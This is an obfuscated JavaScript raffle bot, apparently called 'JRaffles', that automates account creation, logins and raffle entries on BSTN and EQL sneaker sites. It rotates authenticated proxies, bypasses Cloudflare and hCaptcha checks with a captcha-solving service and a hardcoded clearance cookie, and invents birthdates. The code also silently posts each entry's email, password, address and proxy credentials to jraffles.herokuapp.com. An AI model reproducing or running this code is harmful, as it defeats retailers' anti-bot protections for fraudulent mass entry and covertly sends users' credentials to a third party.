                            var _0x3b1c3b = '', _0x38d7d3 = 0x0;
                        _0x73a448(_0x132e92['name'] + '\x20Task\x20' + (_0x40595a + 0x1) + '\x20/\x20' + _0x34c92c['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        var _0x37de81 = Math['round'](Math['random']() * (_0x203bb0['length'] - 0x1)), _0x1c24d0 = _0x203bb0[_0x37de81]['split'](':'), _0x2e26ec;
                        try {
                            _0x2e26ec = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1c24d0[0x0] + ':' + _0x1c24d0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2e26ec = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1c24d0[0x0] + ':' + _0x1c24d0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4aaa8b = await _0x2e26ec['newPage'](), _0x38170b = await _0x4aaa8b['target']()['createCDPSession'](), { windowId: _0x40805c } = await _0x38170b['send']('Browser.getWindowForTarget');
                            await _0x4aaa8b['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x353fe7 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x4aaa8b['authenticate']({
                                'username': '' + _0x1c24d0[0x2],
                                'password': '' + _0x1c24d0[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4aaa8b['goto']('' + _0x34c92c[_0x40595a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x4141df = await _0x4aaa8b['$']('.hcaptcha-box');
                            if (_0x4141df) {
                                console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x9175f4(0x2710);
                                const _0x5840a9 = await _0x4aaa8b['$']('.hcaptcha-box');
                                if (_0x5840a9)
                                    try {
                                        await _0x5840a9['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x4aaa8b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x53ed65 = await _0x4aaa8b['$']('.hcaptcha-box');
                                    if (_0x53ed65)
                                        try {
                                            await _0x53ed65['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x4aaa8b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x38170b['send']('Browser.setWindowBounds', {
                                'windowId': _0x40805c,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x9175f4(0x1388), await _0x4aaa8b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4aaa8b['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x9175f4(0x1f4), console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Logging\x20in'), await _0x4aaa8b['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x583d01 => _0x583d01['click']()), await _0x4aaa8b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4aaa8b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x9175f4(0x7d0), await _0x4aaa8b['waitForSelector']('#email-login'), await _0x4aaa8b['type']('#email-login', '' + _0x34c92c[_0x40595a]['Email']), await _0x9175f4(0xdac), await _0x4aaa8b['waitForSelector']('#password'), await _0x4aaa8b['type']('#password', '' + _0x34c92c[_0x40595a]['Password'], { 'delay': 0xe6 }), await _0x9175f4(0x157c);
                            try {
                                await _0x4aaa8b['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x3a7e00 => _0x3a7e00['click']());
                            } catch {
                            }
                            try {
                                await _0x4aaa8b['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x105b65) {
                            }
                            await _0x9175f4(0x3e8);
                            const _0x2b6669 = await _0x4aaa8b['$']('.enteredDraw_container__2KmQ_');
                            if (_0x2b6669)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x34c92c[_0x40595a]['Size']);
                            try {
                                if (_0x34c92c[_0x40595a]['Size'] != 'RANDOM') {
                                    var _0x3a2efb = _0x34c92c[_0x40595a]['Size']['replace']('.', ',');
                                    const _0x34d237 = await _0x4aaa8b['$x']('//div[contains(text(),\x20' + _0x3a2efb + ')]');
                                    await _0x34d237[0x0]['click']();
                                } else {
                                    const _0x37d3ad = await _0x4aaa8b['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x16db57 = Math['round'](Math['random']() * (_0x37d3ad['length'] - 0x1));
                                    await _0x37d3ad[_0x16db57]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x9175f4(0x1f4);
                            const _0x562db8 = await _0x4aaa8b['$']('.addressList_addressItem__LE2PB');
                            if (_0x562db8 && _0x34c92c[_0x40595a]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4aaa8b['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x9175f4(0x5dc), await _0x4aaa8b['waitForSelector']('#firstname'), await _0x4aaa8b['type']('#firstname', '' + _0x34c92c[_0x40595a]['FirstName']), await _0x9175f4(0x1f4), await _0x4aaa8b['waitForSelector']('#firstname'), await _0x4aaa8b['type']('#lastname', '' + _0x34c92c[_0x40595a]['LastName']), await _0x9175f4(0x1f4), await _0x4aaa8b['waitForSelector']('#firstname'), await _0x4aaa8b['type']('#street', '' + _0x34c92c[_0x40595a]['Address1']), await _0x9175f4(0x1f4), await _0x4aaa8b['waitForSelector']('#firstname'), await _0x4aaa8b['type']('#houseNumber', _0x34c92c[_0x40595a]['HouseNumber'] + '\x20' + _0x34c92c[_0x40595a]['Address2']), await _0x9175f4(0x1f4), await _0x4aaa8b['waitForSelector']('#firstname'), await _0x4aaa8b['select']('#country_code', '' + _0x34c92c[_0x40595a]['Country']), await _0x9175f4(0x1f4), await _0x4aaa8b['type']('#postcode', '' + _0x34c92c[_0x40595a]['Zip']), await _0x9175f4(0x1f4), await _0x4aaa8b['type']('#city', '' + _0x34c92c[_0x40595a]['City']), await _0x9175f4(0x1f4), await _0x4aaa8b['type']('#telephone', '' + _0x34c92c[_0x40595a]['Phone']), await _0x9175f4(0x1f4), await _0x4aaa8b['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x9175f4(0x9c4);
                            try {
                                await _0x4aaa8b['type']('#instagram_name', '' + _0x34c92c[_0x40595a]['Follower']), await _0x4aaa8b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x9175f4(0x5dc);
                            try {
                                await _0x4aaa8b['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x9175f4(0x5dc), await _0x4aaa8b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x42e159 => _0x42e159['click']()), await _0x9175f4(0x1388);
                            try {
                                await _0x4aaa8b['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x4aaa8b['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x34c92c[_0x40595a]['Size'] != 'RANDOM') {
                                    var _0x3a2efb = _0x34c92c[_0x40595a]['Size']['replace']('.', ',');
                                    const _0x1102a3 = await _0x4aaa8b['$x']('//div[contains(text(),\x20' + _0x3a2efb + ')]');
                                    await _0x1102a3[0x0]['click']();
                                } else {
                                    const _0x40ce8d = await _0x4aaa8b['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x16db57 = Math['round'](Math['random']() * (_0x40ce8d['length'] - 0x1));
                                    await _0x40ce8d[_0x16db57]['click']();
                                }
                                await _0x9175f4(0x5dc);
                                try {
                                    await _0x4aaa8b['hover']('#instagram_name'), await _0x4aaa8b['type']('#instagram_name', '' + _0x34c92c[_0x40595a]['Follower']), await _0x4aaa8b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Retrying\x20(' + _0x38d7d3 + '\x20/\x205)');
                                try {
                                    await _0x4aaa8b['hover']('.checkBox_boxHolder__wLGVe'), await _0x9175f4(0x5dc), await _0x4aaa8b['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x9175f4(0x157c), await _0x4aaa8b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x31b3b3 => _0x31b3b3['click']()), await _0x9175f4(0x1388), await _0x4aaa8b['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x3b1c3b = 'no', _0x3e2f6d(_0x34c92c[_0x40595a], _0x132e92);
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x41efe4),
                                    'proxy': '' + _0x203bb0[_0x40595a]
                                };
                                var _0x274bf9 = JSON['stringify'](prxdata);
                                let _0x328470 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x274bf9, _0x328470);
                            } catch (_0x30d433) {
                            }
                            console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x34ca95 = await _0x22ebf6(_0x34c92c[_0x40595a], _0x132e92, 'dev', ![]), _0x4c556f = await _0x22ebf6(_0x34c92c[_0x40595a], _0x132e92, 'pub', ![]);
                            const _0x247fa1 = {
                                'succesDEVMSG': { 'embeds': [_0x34ca95] },
                                'succesPUBMSG': { 'embeds': [_0x4c556f] }
                            };
                            let _0x41efe4 = _0x34c92c[_0x40595a];
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'module': _0x132e92['name'],
                                    'entrydata': JSON['stringify'](_0x41efe4),
                                    'proxy': '' + _0x203bb0[_0x40595a]
                                };
                                var _0x274bf9 = JSON['stringify'](prxdata);
                                let _0x1e8f60 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x274bf9, _0x1e8f60);
                            } catch (_0x2321c8) {
                            }
                            try {
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x247fa1['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x247fa1['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x247fa1['succesPUBMSG']);
                            } catch (_0x130709) {
                                console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x130709));
                            }
                        } catch (_0x4c401b) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20' + _0x4c401b)), _0x3b1c3b = 'yes', _0x1234d9 = '' + _0x4c401b;
                            var _0x1feb43 = await _0x22ebf6(_0x34c92c[_0x40595a], _0x132e92, 'dev', !![], _0x1234d9), _0x34ca95 = await _0x22ebf6(_0x34c92c[_0x40595a], _0x132e92, 'dev', ![]), _0x4c556f = await _0x22ebf6(_0x34c92c[_0x40595a], _0x132e92, 'pub', ![]);
                            const _0x5fc171 = {
                                'succesDEVMSG': { 'embeds': [_0x34ca95] },
                                'succesPUBMSG': { 'embeds': [_0x4c556f] }
                            };
                            _0x5fc171['errorDEV'] = { 'embeds': [_0x1feb43] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x5fc171['errorDEV']), await _0x1cac9f(_0x569bf6, _0x5fc171['errorDEV']);
                        } finally {
                            _0x2e26ec['close']();
                            if (_0x3b1c3b == 'yes' && _0x38d7d3 != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Task\x20' + (_0x40595a + 0x1) + '\x20:\x20Retrying\x20(' + _0x38d7d3 + '\x20/\x205)')), _0x40595a = _0x40595a - 0x1, _0x38d7d3 = _0x38d7d3 + 0x1;
                                continue;
                            }
                            _0x3b1c3b == 'yes' && _0x38d7d3 >= 0x5 && (_0x194f3c(_0x34c92c[_0x40595a], _0x132e92), _0x3b1c3b = 'no', _0x38d7d3 = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x132e92['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x376be2, _0x42ade1) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x5cfb48;
                    try {
                        const _0x3e840c = _0x1ed524['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x5cfb48 = _0x2057e4['parse'](_0x3e840c, { 'header': !![] })['data'];
                    } catch (_0x556a80) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x2980af = 0x0; _0x2980af < _0x5cfb48['length']; _0x2980af++) {
                        if (_0x2966c1 != 'yes')
                            var _0x2966c1 = '', _0x491168 = 0x0;
                        var _0x444483;
                        _0x73a448(_0x376be2['name'] + '\x20Task\x20' + (_0x2980af + 0x1) + '\x20/\x20' + _0x5cfb48['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        var _0x1866d2 = await _0x22ebf6(_0x5cfb48[_0x2980af], _0x376be2, 'acc', ![]);
                        const _0x4363f4 = { 'succesDEVMSG': { 'embeds': [_0x1866d2] } }, _0x4d63b3 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x514486 = Math['round'](Math['random']() * (_0x42ade1['length'] - 0x1)), _0x309433 = _0x42ade1[_0x514486]['split'](':'), _0x146a6c;
                        try {
                            _0x146a6c = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x309433[0x0] + ':' + _0x309433[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x146a6c = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x309433[0x0] + ':' + _0x309433[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x51f7c8 = await _0x146a6c['newPage']();
                            await _0x51f7c8['authenticate']({
                                'username': '' + _0x309433[0x2],
                                'password': '' + _0x309433[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x51f7c8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x51f7c8['setRequestInterception'](!![]), _0x51f7c8['on']('request', _0x2667a3 => {
                                _0x2667a3['resourceType']() === 'image' ? _0x2667a3['abort']() : _0x2667a3['continue']();
                            });
                            try {
                                await _0x51f7c8['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x51f7c8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x2966c1 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x51f7c8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x9175f4(0x3e8), await _0x51f7c8['type']('#email', _0x5cfb48[_0x2980af]['Email']), await _0x9175f4(0x1f4), await _0x51f7c8['type']('#pass', _0x5cfb48[_0x2980af]['Password']), await _0x9175f4(0x1f4), await _0x51f7c8['$eval']('#login-form', _0x237e79 => _0x237e79['submit']());
                            try {
                                await _0x51f7c8['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x9175f4(0x190);
                            const _0x2db1c5 = await _0x51f7c8['evaluate'](() => {
                                const _0x53c91a = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x53c91a['map'](_0x2caae1 => _0x2caae1['alt']);
                            }), _0x48313d = await _0x51f7c8['evaluate'](() => {
                                const _0x340e5f = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x340e5f['map'](_0x318c85 => _0x318c85['innerHTML']);
                            }), _0x4a96bd = await _0x51f7c8['$$']('.raffle-winner');
                            if (_0x4a96bd['length'] < 0x1) {
                                console['log'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x2966c1 = 'no';
                                continue;
                            }
                            console['log'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20' + _0x4a96bd['length'] + '\x20Wins\x20Found!');
                            for (var _0x4aeda3 = 0x0; _0x4aeda3 < _0x4a96bd['length']; _0x4aeda3++) {
                                console['log'](_0x561058['green'](_0x2db1c5[_0x4aeda3] + _0x48313d[_0x4aeda3]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x4b8405) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20' + _0x4b8405)), _0x444483 = '' + _0x4b8405;
                            var _0x246183 = await _0x22ebf6(_0x5cfb48[_0x2980af], _0x376be2, 'acc', !![], _0x444483);
                            _0x4363f4['errorDEV'] = { 'embeds': [_0x246183] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x4363f4['errorDEV']), await _0x1cac9f(_0x569bf6, _0x4363f4['errorDEV']), _0x2966c1 = 'yes';
                        } finally {
                            if (_0x146a6c)
                                _0x146a6c['close']();
                            if (_0x2966c1 == 'yes' && _0x491168 != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Task\x20' + (_0x2980af + 0x1) + '\x20:\x20Retrying\x20(' + _0x491168 + '\x20/\x205)')), _0x2980af = _0x2980af - 0x1, _0x491168 = _0x491168 + 0x1;
                                continue;
                            }
                            _0x2966c1 == 'yes' && _0x491168 >= 0x5 && (_0x194f3c(_0x5cfb48[_0x2980af], _0x376be2), _0x2966c1 = 'no', _0x491168 = 0x0), console['log'](_0x1500d7() + '\x20[' + _0x376be2['name'] + ']\x20Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x1e0ec1, _0x3a9adf, _0x378d7d) {
                _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x263298['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3ad33d = 0x0; _0x3ad33d < _0x3a9adf['length']; _0x3ad33d++) {
                    var _0x79f8a8;
                    _0x73a448(_0x1e0ec1['name'] + '\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20/\x20' + _0x3a9adf['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                    try {
                        await _0x5c0aeb(_0x3a9adf, _0x3ad33d);
                    } catch {
                        _0x4336e2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x26599e(_0x190d9a) {
                        const _0x51d14f = _0x1ed524['readFileSync']('../successful-tasks.csv', 'utf8'), _0x40b73b = _0x2057e4['parse'](_0x51d14f, { 'header': !![] })['data'];
                        let _0x166a16 = ![];
                        for (var _0x29ccef of _0x40b73b) {
                            if (_0x29ccef['Url'] == _0x190d9a['Url'] && _0x29ccef['Email'] == _0x190d9a['Email']) {
                                _0x166a16 = !![];
                                break;
                            }
                        }
                        return _0x166a16;
                    }
                    if (await _0x26599e(_0x3a9adf[_0x3ad33d]) == !![]) {
                        console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x331716 = ![];
                    const _0x361d26 = _0x1ed524['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x3c38bf = _0x2057e4['parse'](_0x361d26, { 'header': !![] })['data'];
                    for (var _0x2daa53 of _0x3c38bf) {
                        _0x2daa53['Email'] == _0x3a9adf[_0x3ad33d]['Email'] && (_0x331716 = !![]);
                    }
                    if (_0x331716 == ![]) {
                        var _0x49c7ee;
                        if (_0x3a9adf[_0x3ad33d]['Url']['endsWith']('/')) {
                            _0x49c7ee = _0x3a9adf[_0x3ad33d]['Url'] + 'register';
                            if (_0x4336e2 != 'yes')
                                var _0x4336e2 = '', _0x3b08bd = 0x0;
                        } else {
                            _0x49c7ee = _0x3a9adf[_0x3ad33d]['Url'] + '/register';
                            if (_0x4336e2 != 'yes')
                                var _0x4336e2 = '', _0x3b08bd = 0x0;
                        }
                        if (_0x3a9adf[_0x3ad33d]['Email'] == '' || _0x3a9adf[_0x3ad33d]['FirstName'] == '' || _0x3a9adf[_0x3ad33d]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3a9adf[_0x3ad33d]['Password'] == '' && (_0x3a9adf[_0x3ad33d]['Password'] = 'JRaffles23!');
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x134016 = _0x378d7d[_0x3ad33d]['split'](':');
                        else
                            var _0x38f843 = Math['round'](Math['random']() * (_0x378d7d['length'] - 0x1)), _0x134016 = _0x378d7d[_0x38f843]['split'](':');
                        var _0x35916d;
                        try {
                            _0x35916d = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x134016[0x0] + ':' + _0x134016[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x35916d = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x134016[0x0] + ':' + _0x134016[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5202b6 = await _0x35916d['newPage']();
                            await _0x5202b6['authenticate']({
                                'username': '' + _0x134016[0x2],
                                'password': '' + _0x134016[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5202b6['setRequestInterception'](!![]), _0x5202b6['on']('request', _0x137c22 => {
                                _0x137c22['resourceType']() === 'image' || _0x137c22['resourceType']() === 'font' || _0x137c22['resourceType']() === 'media' ? _0x137c22['abort']() : _0x137c22['continue']();
                            });
                            try {
                                await _0x5202b6['goto']('' + _0x49c7ee);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x9175f4(0x3e8), await _0x5202b6['waitForSelector']('#email'), await _0x5202b6['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x9175f4(0x3e8);
                            try {
                                await _0x5202b6['click']('li[data-value=\x22EU\x20' + _0x3a9adf[_0x3ad33d]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x3a9adf[_0x3ad33d]['Size']);
                            }
                            await _0x9175f4(0x6a4), await _0x5202b6['type']('#email', '' + _0x3a9adf[_0x3ad33d]['Email']), await _0x9175f4(0x352), await _0x5202b6['waitForSelector']('#password'), await _0x5202b6['type']('#password', '' + _0x3a9adf[_0x3ad33d]['Password']), await _0x9175f4(0x352), await _0x5202b6['type']('#phone', '' + _0x3a9adf[_0x3ad33d]['Phone']), await _0x9175f4(0x352);
                            const _0x4b12db = await _0x5202b6['$']('#title\x20>\x20label');
                            await _0x9175f4(0x12c);
                            _0x4b12db && await _0x4b12db['click']();
                            await _0x5202b6['type']('#firstName', '' + _0x3a9adf[_0x3ad33d]['FirstName']), await _0x9175f4(0x352), await _0x5202b6['type']('#lastName', '' + _0x3a9adf[_0x3ad33d]['LastName']), await _0x9175f4(0x352);
                            _0x3a9adf[_0x3ad33d]['Url']['includes']('footlocker.de') ? await _0x5202b6['type']('#birthdate', _0x25f588(0xa, 0x1c) + '.' + _0x25f588(0xa, 0xc) + '.' + _0x25f588(0x7c6, 0x7d3)) : await _0x5202b6['type']('#birthdate', _0x25f588(0xa, 0x1c) + '-' + _0x25f588(0xa, 0xc) + '-' + _0x25f588(0x7c6, 0x7d3));
                            await _0x9175f4(0x352), await _0x5202b6['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x5202b6['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x9175f4(0x1f4), await _0x5202b6['click']('#stateAutocomplete'), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Setting\x20Address'), await _0x9175f4(0x1f4);
                            try {
                                const _0x37c39c = await _0x5202b6['$x']('//li[text()=\x22' + _0x3a9adf[_0x3ad33d]['State'] + '\x22]');
                                await _0x37c39c[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
